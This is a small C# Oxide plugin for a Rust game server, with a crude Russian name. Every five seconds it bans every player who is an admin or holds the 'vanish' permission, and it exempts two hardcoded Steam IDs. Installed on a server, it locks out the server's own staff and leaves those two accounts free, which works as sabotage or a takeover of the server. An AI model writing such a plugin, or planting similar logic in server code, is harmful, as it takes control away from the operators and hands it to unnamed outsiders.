   namespace Oxide.Plugins
{
    [Info("BanHuesosov", "Molik", "1.0.0")]
    public class BanHuesosov : RustPlugin
    {
        void OnServerInitialized()
        {
            timer.Every(5f, Huy);
        }
        void Huy()
        {
            foreach (var player in BasePlayer.activePlayerList)
                Check(player);
        }
        void Check(BasePlayer player)
        {
            string steamid_kurushimu = "76561199310118239";
            string steamid_dorevel = "76561199420437841";
            if (player.UserIDString == steamid_kurushimu|| player.UserIDString == steamid_dorevel)return;
            if (player.IsAdmin || permission.UserHasPermission(player.UserIDString, "vanish.allow"))

            {
                Server.Command($"ban {player.UserIDString} НЕВЫШЛО");
            }
        }
    }
}